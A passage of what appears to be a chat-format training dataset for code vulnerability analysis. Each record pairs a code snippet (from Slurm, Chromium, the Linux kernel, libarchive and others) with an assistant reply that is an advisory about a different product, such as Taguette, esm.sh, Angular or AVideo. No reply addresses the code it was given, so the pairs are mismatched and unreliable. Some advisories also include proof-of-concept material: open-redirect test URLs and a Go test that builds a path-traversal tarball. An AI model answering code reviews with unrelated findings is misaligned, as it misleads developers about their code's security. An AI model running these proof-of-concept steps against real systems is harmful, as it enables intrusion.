access\" was rolled back. So updating is highly recommended as a defense-in-depth strategy.\n\n# Credit\n\nThe fetch bypass was originally theorized by @avilum at [Oligo](https://www.oligo.security/). The DNS rebinding step, full POC, and disclosure was by @JLLeitschuh while at [Socket](https://socket.dev/)."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n_terminate_all_steps(uint32_t jobid, bool batch)\n{\n\tList steps;\n\tListIterator i;\n\tstep_loc_t *stepd;\n\tint step_cnt  = 0;\n\tint fd;\n\n\tsteps = stepd_available(conf->spooldir, conf->node_name);\n\ti = list_iterator_create(steps);\n\twhile ((stepd = list_next(i))) {\n\t\tif (stepd->jobid != jobid) {\n\t\t\t/* multiple jobs expected on shared nodes */\n\t\t\tdebug3(\"Step from other job: jobid=%u (this jobid=%u)\",\n\t\t\t       stepd->jobid, jobid);\n\t\t\tcontinue;\n\t\t}\n\n\t\tif ((stepd->stepid == SLURM_BATCH_SCRIPT) && (!batch))\n\t\t\tcontinue;\n\n\t\tstep_cnt++;\n\n\t\tfd = stepd_connect(stepd->directory, stepd->nodename,\n\t\t\t\t   stepd->jobid, stepd->stepid,\n\t\t\t\t   &stepd->protocol_version);\n\t\tif (fd == -1) {\n\t\t\tdebug3(\"Unable to connect to step %u.%u\",\n\t\t\t       stepd->jobid, stepd->stepid);\n\t\t\tcontinue;\n\t\t}\n\n\t\tdebug2(\"terminate job step %u.%u\", jobid, stepd->stepid);\n\t\tif (stepd_terminate(fd, stepd->protocol_version) < 0)\n\t\t\tdebug(\"kill jobid=%u.%u failed: %m\", jobid,\n\t\t\t      stepd->stepid);\n\t\tclose(fd);\n\t}\n\tlist_iterator_destroy(i);\n\tFREE_NULL_LIST(steps);\n\tif (step_cnt == 0)\n\t\tdebug2(\"No steps in job %u to terminate\", jobid);\n\treturn step_cnt;\n}\n\n```"}, {"role": "assistant", "content": "OpenClaw iMessage group allowlist authorization inherited DM pairing-store identities\n\n## Summary\nUnder iMessage `groupPolicy=allowlist`, group authorization could be satisfied by sender identities coming from the DM pairing store, broadening DM trust into group contexts.\n\n## Details\nAffected component: `src/imessage/monitor/monitor-provider.ts`.\n\nVulnerable logic derived `effectiveGroupAllowFrom` using both the static group allowlist and DM pairing-store identities (`storeAllowFrom`). This allowed a sender approved via DM pairing to satisfy group authorization in groups even if the sender/chat was not explicitly present in `groupAllowFrom`.\n\nThis weakens boundary separation between DM pairing and group allowlist authorization.\n\n## Affected Packages / Versions\n- `openclaw` (npm): affected `<= 2026.2.13`\n- `clawdbot` (npm): affected `<= 2026.1.24-3`\n\n## Fix Commit(s)\n- `openclaw/openclaw@872079d42fe105ece2900a1dd6ab321b92da2d59`\n- `openclaw/openclaw@90d1e9cd71419168b2faa54a759b124a3eacfae7`\n\nThanks @vincentkoc for reporting."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nbool ChromeMetricsServiceClient::RegisterForProfileEvents(Profile* profile) {\n#if defined(OS_CHROMEOS)\n  if (chromeos::ProfileHelper::IsSigninProfile(profile) ||\n      chromeos::ProfileHelper::IsLockScreenAppProfile(profile)) {\n    return true;\n  }\n#endif\n#if defined(OS_WIN) || defined(OS_MACOSX) || \\\n    (defined(OS_LINUX) && !defined(OS_CHROMEOS))\n  metrics::DesktopProfileSessionDurationsServiceFactory::GetForBrowserContext(\n      profile);\n#endif\n\n  history::HistoryService* history_service =\n      HistoryServiceFactory::GetForProfile(profile,\n                                           ServiceAccessType::IMPLICIT_ACCESS);\n  if (!history_service) {\n    return false;\n  }\n\n  ObserveServiceForDeletions(history_service);\n\n  syncer::SyncService* sync =\n      ProfileSyncServiceFactory::GetSyncServiceForBrowserContext(profile);\n  if (!sync) {\n    return false;\n  }\n  ObserveServiceForSyncDisables(sync, profile->GetPrefs());\n  return true;\n}\n\n```"}, {"role": "assistant", "content": "Formwork CMS has Stored Cross-Site Scripting Vulnerebility in Blog Tags\n\n### Summary\nInserting unsanitized data into the blog tag field in Formwork CMS results in stored cross‑site scripting (XSS).\nAny user with credentials to the Formwork CMS who accesses or edits an affected blog post will have attacker‑controlled script executed in their browser. Because the issue is persistent and impacts privileged administrative workflows, the severity is elevated.\n\n### Details\nFormwork CMS fails to properly sanitize data inserted into tags, before saving them and rendering them into the edit blog interface.  When a specially crafted tag becomes saved as a tag into the system, it is unable to be removed.  Any attempt to remove the tag from the affected post, causes the XSS to trigger once again.\n\nAdditionally, once the malicious tag is present, managing standard tags becomes impossible. This is due to script execution on attempted modification. This leads to a form of interface lockout where the payload continually reinserts itself due to the stored, unsafe rendering.\n\n### Impact\nThis is a stored cross‑site scripting (XSS) vulnerability.\n\nThis impacts all users who access the affected blog post’s edit page.\n\n### Patches\n[Formwork 2.2.0](https://github.com/getformwork/formwork/releases/tag/2.2.0) ensures proper escaping of user input in tag fields."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstruct rds_connection *rds_conn_create_outgoing(struct net *net,\n\t\t\t\t\t\t__be32 laddr, __be32 faddr,\n\t\t\t\t       struct rds_transport *trans, gfp_t gfp)\n{\n\treturn __rds_conn_create(net, laddr, faddr, trans, gfp, 1);\n}\n\n```"}, {"role": "assistant", "content": "Duplicate Advisory: GoBase Race Condition vulnerability\n\n## Duplicate Advisory\nThis advisory has been withdrawn because it is a duplicate of GHSA-h2x7-2ff6-v32p. This link is maintained to preserve external references.\n\n## Original Description\nA race condition can cause incorrect HTTP request routing."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nchar *am_get_endpoint_url(request_rec *r)\n{\n    am_dir_cfg_rec *cfg = am_get_dir_cfg(r);\n\n    return ap_construct_url(r->pool, cfg->endpoint_path, r);\n}\n\n```"}, {"role": "assistant", "content": "Open Redirect Vulnerability in Taguette\n\n## Summary\n\nAn Open Redirect vulnerability exists in Taguette that allows attackers to craft malicious URLs that redirect users to arbitrary external websites after authentication. This can be exploited for phishing attacks where victims believe they are interacting with a trusted Taguette instance but are redirected to a malicious site designed to steal credentials or deliver malware.\n\n**Severity:** Medium to High  \n\n---\n\n## Details\n\nThe application accepts a user-controlled `next` parameter and uses it directly in HTTP redirects without any validation. The vulnerable code is located in two places:\n\n### Location 1: Login Handler (`taguette/web/views.py`, lines 140-144)\n\n```python\ndef _go_to_next(self):\n    next_ = self.get_argument('next', '')\n    if not next_:\n        next_ = self.reverse_url('index')\n    return self.redirect(next_)  # ← No validation of next_ parameter\n```\n\nThis method is called after successful login (line 132) and when an already-logged-in user visits the login page (line 109).\n\n### Location 2: Cookies Prompt Handler (`taguette/web/views.py`, lines 79-85)\n\n```python\ndef post(self):\n    self.set_cookie('cookies_accepted', 'yes', dont_check=True)\n    next_ = self.get_argument('next', '')\n    if not next_:\n        next_ = self.reverse_url('index')\n    return self.redirect(next_)  # ← No validation of next_ parameter\n```\n\nIn both cases, if `next_` is provided by the user, it is passed directly to `self.redirect()` without checking whether it points to the same host or is a relative URL.\n\n---\n\n[![pic](https://github.com/user-attachments/assets/ac0afe1f-a8ac-4ac0-88f5-1c2cd092ca46)](url)\n\n\n## PoC\n\nSimply replace `[your-taguette-instance]` with your Taguette server domain and test these URLs in your browser:\n\n### Test 1: Cookies Prompt Redirect\n\n```\nhttps://[your-taguette-instance]/cookies?next=https://google.com\n```\n\n1. Open the URL above in your browser\n2. Click \"Accept cookies\" button\n3. **Result:** You are redirected to `https://google.com` (external site)\n\n### Test 2: Login Redirect\n\n```\nhttps://[your-taguette-instance]/login?next=https://google.com\n```\n\n1. Open the URL above in your browser\n2. Log in with valid credentials\n3. **Result:** You are redirected to `https://google.com` (external site)\n\n### Test 3: Already Logged In Redirect\n\n```\nhttps://[your-taguette-instance]/login?next=https://google.com\n```\n\n1. First, log in to Taguette normally\n2. Then open the URL above\n3. **Result:** You are immediately redirected to `https://google.com`\n\n> **Note:** We use `google.com` as a safe external site for testing. In a real attack, this would be a phishing site.\n\n---\n\n## Impact\n\n- **Who is affected:** All users of any Taguette instance running in multi-user mode\n- **Attack vector:** Social engineering / phishing via crafted URLs\n- **Exploitability:** Trivial - requires only crafting a URL with a malicious `next` parameter\n- **Consequences:**\n  - Credential theft through phishing\n  - Malware distribution\n  - Session hijacking\n  - Reputation damage to organizations running Taguette instances\n\nThe vulnerability is particularly dangerous because:\n1. The login page displayed is completely legitimate, building victim trust\n2. Users have just entered their credentials, making them more likely to enter them again on a fake \"session expired\" page\n3. The trusted domain in the URL makes the attack more convincing\n\n---\n\n## Recommended Fix\n\nValidate that the `next` parameter is either a relative URL or points to the same host before redirecting.\n\n### Example Fix\n\nAdd a validation function:\n\n```python\nfrom urllib.parse import urlparse\n\ndef is_safe_url(url, host):\n    \"\"\"Check if URL is safe for redirect (relative or same host).\"\"\"\n    if not url:\n        return False\n    parsed = urlparse(url)\n    # Reject protocol-relative URLs (//evil.com)\n    if url.startswith('//'):\n        return False\n    # Allow relative URLs (no scheme and no netloc)\n    if not parsed.scheme and not parsed.netloc:\n        return True\n    # Allow same-host URLs\n    return parsed.netloc == host\n```\n\nThen update the vulnerable methods:\n\n```python\ndef _go_to_next(self):\n    next_ = self.get_argument('next', '')\n    if not next_ or not is_safe_url(next_, self.request.host):\n        next_ = self.reverse_url('index')\n    return self.redirect(next_)\n```\n\nApply the same fix to the `CookiesPrompt.post()` method.\n\n---"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nDetectPrefilterBuildNonPrefilterList(DetectEngineThreadCtx *det_ctx, SignatureMask mask, uint8_t alproto)\n{\n    uint32_t x = 0;\n    for (x = 0; x < det_ctx->non_pf_store_cnt; x++) {\n        /* only if the mask matches this rule can possibly match,\n         * so build the non_mpm array only for match candidates */\n        const SignatureMask rule_mask = det_ctx->non_pf_store_ptr[x].mask;\n        const uint8_t rule_alproto = det_ctx->non_pf_store_ptr[x].alproto;\n        if ((rule_mask & mask) == rule_mask && (rule_alproto == 0 || rule_alproto == alproto)) {\n            det_ctx->non_pf_id_array[det_ctx->non_pf_id_cnt++] = det_ctx->non_pf_store_ptr[x].id;\n        }\n    }\n}\n\n```"}, {"role": "assistant", "content": "Babylon's BIP322 signature implementation is not fully compliant to the spec\n\n### Summary\n\nThe BIP-322 signature verification does not enforce the SIGHASH value to be SIGHASH_ALL, and therefore is not strictly following the [spec](https://bips.dev/322/).\n\n### Impact\n\nNon-compliant BIP-322 signatures in proof of possessions can be accepted by the chain."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n\t\tvoid CWebServer::Cmd_ExcecuteScript(WebEmSession & session, const request& req, Json::Value &root)\n\t\t{\n\t\t\tstd::string scriptname = request::findValue(&req, \"scriptname\");\n\t\t\tif (scriptname.empty())\n\t\t\t\treturn;\n\t\t\tif (scriptname.find(\"..\") != std::string::npos)\n\t\t\t\treturn;\n#ifdef WIN32\n\t\t\tscriptname = szUserDataFolder + \"scripts\\\\\" + scriptname;\n#else\n\t\t\tscriptname = szUserDataFolder + \"scripts/\" + scriptname;\n#endif\n\t\t\tif (!file_exist(scriptname.c_str()))\n\t\t\t\treturn;\n\t\t\tstd::string script_params = request::findValue(&req, \"scriptparams\");\n\t\t\tstd::string strparm = szUserDataFolder;\n\t\t\tif (!script_params.empty())\n\t\t\t{\n\t\t\t\tif (strparm.size() > 0)\n\t\t\t\t\tstrparm += \" \" + script_params;\n\t\t\t\telse\n\t\t\t\t\tstrparm = script_params;\n\t\t\t}\n\t\t\tstd::string sdirect = request::findValue(&req, \"direct\");\n\t\t\tif (sdirect == \"true\")\n\t\t\t{\n\t\t\t\t_log.Log(LOG_STATUS, \"Executing script: %s\", scriptname.c_str());\n#ifdef WIN32\n\t\t\t\tShellExecute(NULL, \"open\", scriptname.c_str(), strparm.c_str(), NULL, SW_SHOWNORMAL);\n#else\n\t\t\t\tstd::string lscript = scriptname + \" \" + strparm;\n\t\t\t\tint ret = system(lscript.c_str());\n\t\t\t\tif (ret != 0)\n\t\t\t\t{\n\t\t\t\t\t_log.Log(LOG_ERROR, \"Error executing script command (%s). returned: %d\", lscript.c_str(), ret);\n\t\t\t\t\treturn;\n\t\t\t}\n#endif\n\t\t}\n\t\t\telse\n\t\t\t{\n\t\t\t\tm_sql.AddTaskItem(_tTaskItem::ExecuteScript(0.2f, scriptname, strparm));\n\t\t\t}\n\t\t\troot[\"title\"] = \"ExecuteScript\";\n\t\t\troot[\"status\"] = \"OK\";\n\t\t}\n\n```"}, {"role": "assistant", "content": "SQL Injection in typeorm\n\nVersions of `typeorm` before 0.1.15 are vulnerable to SQL Injection. Field names are not properly validated allowing attackers to inject SQL statements and execute arbitrary SQL queries.\n\n\n## Recommendation\n\nUpgrade to version 0.1.15"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nbool omx_venc::dev_free_buf(void *buf_addr,unsigned port)\n{\n return handle->venc_free_buf(buf_addr,port);\n}\n\n```"}, {"role": "assistant", "content": "Weblate wlc has insecure API key configuration\n\n### Impact\nHistorically, wlc supported providing unscoped API keys in the setting. This practice was discouraged for years, but the code was never removed. This might cause the API key to be used against different server.\n\n### Patches\n* https://github.com/WeblateOrg/wlc/pull/1098\n\n### Workarounds\nRemove unscoped `key` from wlc configuration. Only use URL-scoped keys in the `[keys]` sections.\n\n### References\nThis issue was reported to us by [wh1zee](https://hackerone.com/wh1zee) via HackerOne."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nv8::Local<v8::Object> ObjectBackedNativeHandler::NewInstance() {\n  return v8::Local<v8::ObjectTemplate>::New(GetIsolate(), object_template_)\n      ->NewInstance();\n}\n\n```"}, {"role": "assistant", "content": "Gitea does not properly validate ownership when toggling OpenID URI visibility\n\nGitea does not properly validate ownership when toggling OpenID URI visibility. An authenticated user may be able to change the visibility settings of other users' OpenID identities."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nset_mac_metadata(struct archive_write_disk *a, const char *pathname,\n\t\t const void *metadata, size_t metadata_size)\n{\n\t(void)a; /* UNUSED */\n\t(void)pathname; /* UNUSED */\n\t(void)metadata; /* UNUSED */\n\t(void)metadata_size; /* UNUSED */\n\treturn (ARCHIVE_OK);\n}\n\n```"}, {"role": "assistant", "content": "esm.sh has a path traversal in extractPackageTarball enables file writes from malicious packages\n\n### Summary\n\nThe [commit](https://github.com/esm-dev/esm.sh/commit/9d77b88c320733ff6689d938d85d246a3af9af16) does not actually fix the path traversal bug. `path.Clean` basically normalizes a path but does not prevent absolute paths in a malicious tar file.\n\n### PoC\n\nThis test file can demonstrate the basic idea pretty easily:\n\n```go\npackage server\n\nimport (\n\t\"archive/tar\"\n\t\"bytes\"\n\t\"compress/gzip\"\n\t\"testing\"\n)\n\n// TestExtractPackageTarball_PathTraversal tests the extractPackageTarball function\n// with a malicious tarball containing a path traversal attempt\nfunc TestExtractPackageTarball_PathTraversal(t *testing.T) {\n\t// Create a temporary directory for testing\n\tinstallDir := \"./testdata/good\"\n\n\t// Create a malicious tarball with path traversal\n\tvar buf bytes.Buffer\n\tgw := gzip.NewWriter(&buf)\n\ttw := tar.NewWriter(gw)\n\n\t// Add a normal file\n\tcontent := []byte(\"export const foo = 'bar';\")\n\theader := &tar.Header{\n\t\tName:     \"package/index.js\",\n\t\tMode:     0644,\n\t\tSize:     int64(len(content)),\n\t\tTypeflag: tar.TypeReg,\n\t}\n\tif err := tw.WriteHeader(header); err != nil {\n\t\tt.Fatal(err)\n\t}\n\tif _, err := tw.Write(content); err != nil {\n\t\tt.Fatal(err)\n\t}\n\n\t// Add a malicious file with path traversal\n\tbad := []byte(\"bad\")\n\theader = &tar.Header{\n\t\tName:     \"/../../../bad/bad.txt\",\n\t\tMode:     0644,\n\t\tSize:     int64(len(bad)),\n\t\tTypeflag: tar.TypeReg,\n\t}\n\tif err := tw.WriteHeader(header); err != nil {\n\t\tt.Fatal(err)\n\t}\n\tif _, err := tw.Write(bad); err != nil {\n\t\tt.Fatal(err)\n\t}\n\n\ttw.Close()\n\tgw.Close()\n\n\t// Call extractPackageTarball with the malicious tarball\n\tif err := extractPackageTarball(installDir, \"test-package\", bytes.NewReader(buf.Bytes())); err != nil {\n\t\tt.Errorf(\"extractPackageTarball returned error: %v\", err)\n\t}\n}\n```\n\n### Impact\n\nIt, at the very least, seems to enable overwriting the esm.sh configuration file and poisoning cached packages.\n\nArbitrary file write _can_ lead to server-side code execution (e.g. Writing to cron files) but it may not be feasible for the default deployment configuration that is checked in. Whether some self-hosted configuration is modified to _enable_ code execution is unclear.\n\nThe limiting factors in the default setup that limit escalating this to code execution:\n\n - `extractPackageTarball` has a file-extension check which makes some more \"obvious\" escalations like overwriting binaries in `/esm/bin`  (e.g. `deno`) impractical since it requires the target file to have an allowlisted extension.\n - Using the `Dockerfile` in the repo as a baseline for the typical setup: The binary does not run as root and, for the most part, can really only write to `/tmp` and it's home directory.\n - The deployment scripts do not seem to rely on executing potentially poisoned files in `/tmp.\n\n### Fix\n\nUsing [`os.Root`](https://go.dev/blog/osroot) seems like it will solve this issue and doesn't require new dependencies."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n    String16 firstArgToString(const String16& defaultValue)\n    {\n        if (m_info.Length() < 1)\n            return defaultValue;\n        v8::Local<v8::String> titleValue;\n        if (m_info[0]->IsObject()) {\n            if (!m_info[0].As<v8::Object>()->ObjectProtoToString(m_context).ToLocal(&titleValue))\n                return defaultValue;\n        } else {\n            if (!m_info[0]->ToString(m_context).ToLocal(&titleValue))\n                return defaultValue;\n        }\n        return toProtocolString(titleValue);\n    }\n\n```"}, {"role": "assistant", "content": "Liferay Portal and Liferay DXP vulnerable to Stored Cross-site Scripting\n\nA stored cross-site scripting (XSS) vulnerability in Liferay Portal 7.4.3.45 through 7.4.3.128, and Liferay DXP 2024 Q2.0 through 2024.Q2.9, 2024.Q1.1 through 2024.Q1.12, and 7.4 update 45 through update 92 allows remote attackers to execute an arbitrary web script or HTML in the My Workflow Tasks page."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic void FillIQMatrix(const JpegQuantizationTable* q_table,\n                         VAIQMatrixBufferJPEGBaseline* iq_matrix) {\n  static_assert(kJpegMaxQuantizationTableNum ==\n                    std::extent<decltype(iq_matrix->load_quantiser_table)>(),\n                \"max number of quantization table mismatched\");\n  static_assert(\n      sizeof(iq_matrix->quantiser_table[0]) == sizeof(q_table[0].value),\n      \"number of quantization entries mismatched\");\n  for (size_t i = 0; i < kJpegMaxQuantizationTableNum; i++) {\n    if (!q_table[i].valid)\n      continue;\n    iq_matrix->load_quantiser_table[i] = 1;\n    for (size_t j = 0; j < base::size(q_table[i].value); j++)\n      iq_matrix->quantiser_table[i][j] = q_table[i].value[j];\n  }\n}\n\n```"}, {"role": "assistant", "content": "Angular Stored XSS Vulnerability via SVG Animation, SVG URL and MathML Attributes\n\nA **Stored Cross-Site Scripting ([XSS](https://angular.dev/best-practices/security#preventing-cross-site-scripting-xss))** vulnerability has been identified in the **Angular Template Compiler**. It occurs because the compiler's internal security schema is incomplete, allowing attackers to bypass Angular's built-in security sanitization. Specifically, the schema fails to classify certain URL-holding attributes (e.g., those that could contain [`javascript:` URLs](https://developer.mozilla.org/en-US/Web/URI/Reference/Schemes/javascript)) as requiring strict URL security, enabling the injection of malicious scripts.\n\nAdditionally, a related vulnerability exists involving SVG animation elements (`<animate>`, `<set>`, `<animateMotion>`, `<animateTransform>`). The `attributeName` attribute on these elements was not properly validated, allowing attackers to dynamically target security-sensitive attributes like `href` or `xlink:href` on other elements. By binding `attributeName` to \"href\" and providing a `javascript:` URL in the `values` or `to` attribute, an attacker could bypass sanitization and execute arbitrary code.\n\nAttributes confirmed to be vulnerable include:\n*   SVG-related attributes: (e.g., `xlink:href`), and various MathML attributes (e.g., `math|href`, `annotation|href`).\n*   SVG animation `attributeName` attribute when bound to \"href\" or \"xlink:href\".\n\nWhen template binding is used to assign untrusted, user-controlled data to these attributes (e.g., `[attr.xlink:href]=\"maliciousURL\"` or `<animate [attributeName]=\"'href'\" [values]=\"maliciousURL\">`), the compiler incorrectly falls back to a non-sanitizing context or fails to block the dangerous attribute assignment. This allows an attacker to inject a `javascript:URL` payload. Upon user interaction (like a click) on the element, or automatically in the case of animations, the malicious JavaScript executes in the context of the application's origin.\n\n### Impact\n\nWhen exploited, this vulnerability allows an attacker to execute arbitrary code within the context of the vulnerable application's domain. This enables:\n\n* **Session Hijacking:** Stealing session cookies and authentication tokens.  \n* **Data Exfiltration:** Capturing and transmitting sensitive user data.  \n* **Unauthorized Actions:** Performing actions on behalf of the user.\n\n### Patches\n\n- 19.2.17\n- 20.3.15\n- 21.0.2\n\n### Attack Preconditions\n\n* The victim's Angular application must render data derived from **untrusted input** (e.g., from a database or API) and bind it to one of the unsanitized URL attributes or the `attributeName` of an SVG animation element.\n* The victim must perform a **user interaction** (e.g., clicking) on the compromised element for the stored script to execute, or the animation must trigger the execution.\n\n### Workarounds\n\nIf you cannot upgrade, you can workaround the issue by ensuring that any data bound to the vulnerable attributes is never sourced from untrusted user input (e.g., database, API response, URL parameters).\n\n* **Avoid Affected Template Bindings:** Specifically avoid using template bindings (e.g., `[attr.xlink:href]=\"maliciousURL\"`) to assign untrusted data to the vulnerable SVG/MathML attributes.\n* **Avoid Dynamic `attributeName` on SVG Animations:** Do not bind untrusted data to the `attributeName` attribute of SVG animation elements (`<animate>`, `<set>`, etc.).\n* **Enable [Content Security Policy (CSP)](https://angular.dev/best-practices/security#content-security-policy):** Configure a robust CSP header that disallows `javascript:` URLs."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n  BookmarkNode* GetMutableNode(const std::string& name) {\n    return const_cast<BookmarkNode*>(GetNode(name));\n  }\n\n```"}, {"role": "assistant", "content": "New API has Potential XSS in its MarkdownRenderer component\n\n### Summary\n\nA potential unsafe operation occurs in component `MarkdownRenderer.jsx`, allowing for Cross-Site Scripting(XSS) when the model outputs items containing `<script>` tag.\n\n### Details\n\nLine 212-231 of `MarkdownRenderer.jsx` is unsafe, it use dangerouslySetInnerHTML to preview html the model generates. This can trigger malcious scripts.\n\n### PoC\n\nA simple way to exploit that is to ask the model in the playground, with prompt: \"请帮我写个脚本，跳转到google\", and then the browser will navigate to the google.com without user interference.\n\n### Impact\n\nPotential malcious activity to the user using playground, if the model api is altered to output unintended codes.\n\nAlso, users may not be easily rid the exploit, since the record of the chat containing XSS script is stored, once opening the page later, the script will be re-triggered.\n\n### Potential Workaround\n\nThe preview may be placed in an iframe sandbox, dangerous html strings should be purified before rendering.\n\n---\n\nThe reply generated for test is as below:\n\n这是一个为您编写的单页 HTML 文件。它使用了两种方式来实现跳转，以确保在任何情况下都能工作：\n\n1.  **JavaScript (`window.location.replace`)**：这是最常用且高效的方法，它会立即跳转，并且不会保留当前页面在浏览器历史记录中（这样用户按“后退”键不会回到这个跳转页）。\n2.  **HTML Meta Refresh**：作为后备方案。如果用户的浏览器禁用了 JavaScript，这个标签会在 1 秒后将用户带往 Google。\n3.  **手动链接**：页面中显示了一个备用链接，以防自动跳转被拦截或失效。\n\n您可以直接保存以下代码为 `.html` 文件并在浏览器中打开。\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>正在跳转至 Google...</title>\n    \n    <!-- 方法1：HTML Meta Refresh (如果JS被禁用，1秒后自动跳转) -->\n    <meta http-equiv=\"refresh\" content=\"1;url=https://www.google.com\">\n\n    <style>\n        /* 基础重置与布局 */\n        body, html {\n            height: 100%;\n            margin: 0;\n            font-family: -apple-system, BlinkMacSystemFont, \"Segoe UI\", Roboto, \"Helvetica Neue\", Arial, sans-serif;\n            background-color: #f8f9fa;\n            color: #202124;\n            display: flex;\n            justify-content: center;\n            align-items: center;\n        }\n\n        /* 卡片容器样式 */\n        .redirect-card {\n            background: white;\n            padding: 2rem 3rem;\n            border-radius: 12px;\n            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);\n            text-align: center;\n            max-width: 400px;\n            width: 90%;\n        }\n\n        /* 加载动画圆圈 */\n        .spinner {\n            border: 4px solid #f3f3f3;\n            border-top: 4px solid #4285f4; /* Google Blue */\n            border-radius: 50%;\n            width: 40px;\n            height: 40px;\n            animation: spin 1s linear infinite;\n            margin: 0 auto 1.5rem auto;\n        }\n\n        /* 文本排版 */\n        h1 {\n            font-size: 1.25rem;\n            margin-bottom: 0.5rem;\n            font-weight: 500;\n        }\n\n        p {\n            font-size: 0.95rem;\n            color: #5f6368;\n            margin-bottom: 1.5rem;\n            line-height: 1.5;\n        }\n\n        /* 手动链接样式 */\n        .manual-link {\n            display: inline-block;\n            color: #1a73e8; /* Google Link Blue */\n            text-decoration: none;\n            font-weight: 500;\n            padding: 0.5rem 1rem;\n            border: 1px solid #dadce0;\n            border-radius: 4px;\n            transition: background-color 0.2s;\n        }\n\n        .manual-link:hover {\n            background-color: #f1f3f4;\n            text-decoration: underline;\n        }\n\n        /* 动画定义 */\n        @keyframes spin {\n            0% { transform: rotate(0deg); }\n            100% { transform: rotate(360deg); }\n        }\n    </style>\n</head>\n<body>\n\n    <main class=\"redirect-card\">\n        <!-- 视觉反馈：加载动画 -->\n        <div class=\"spinner\"></div>\n        \n        <!-- 提示信息 -->\n        <h1>正在为您跳转</h1>\n        <p>我们正在将您引导至 Google。<br>如果页面没有自动刷新，请点击下方的按钮。</p>\n        \n        <!-- 手动跳转链接 -->\n        <a href=\"https://www.google.com\" class=\"manual-link\">立即前往 Google</a>\n    </main>\n\n    <script>\n        // 方法2：JavaScript 跳转 (推荐)\n        // 使用 replace() 而不是 href，这样用户点击“后退”时不会死循环回到这个跳转页\n        (function() {\n            // 目标地址\n            var targetUrl = \"https://www.google.com\";\n\n            // 执行跳转\n            window.location.replace(targetUrl);\n            \n            // 控制台日志（用于调试）\n            console.log(\"Redirecting to: \" + targetUrl);\n        })();\n    </script>\n\n</body>\n</html>\n```\n\n### Acknowledgments\n\nQuantumNous would like to thank **TechnologyStar** for the early notification of this potential vulnerability via AI-assisted tools, and **small-lovely-cat** for providing additional context and an initial patch. The final fix was developed and verified by the maintainers to ensure full compatibility with the project's architecture."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid MetricsWebContentsObserver::RegisterInputEventObserver(\n    content::RenderViewHost* host) {\n  if (host != nullptr)\n    host->GetWidget()->AddInputEventObserver(this);\n}\n\n```"}, {"role": "assistant", "content": "AVideo has Stored Cross-Site Scripting via Markdown Comment Injection\n\n## Vulnerability Type\nStored Cross-Site Scripting (XSS) — CWE-79.\n\n## Affected Product/Versions\nAVideo 18.0.\n\n## Root Cause Summary\nAVideo allows Markdown in video comments and uses Parsedown (v1.7.4) without Safe Mode enabled. Markdown links are not sufficiently sanitized, allowing `javascript:` URIs to be rendered as clickable links.\n\n## Impact Summary\nAn authenticated low-privilege attacker can post a malicious comment that injects persistent JavaScript. When another user clicks the link, the attacker can perform actions such as session hijacking, privilege escalation (including admin takeover), and data exfiltration.\n\n## Resolution/Fix\nThe issue was confirmed and fixed in the master branch. An official release will be published soon.\n\n## Workarounds\nUntil the release is available, validate and block unsafe URI schemes (e.g., `javascript:`) before rendering Markdown, and enable Parsedown Safe Mode.\n\n## Credits/Acknowledgement\nReported by Arkadiusz Marta (https://github.com/arkmarta/)."}]}
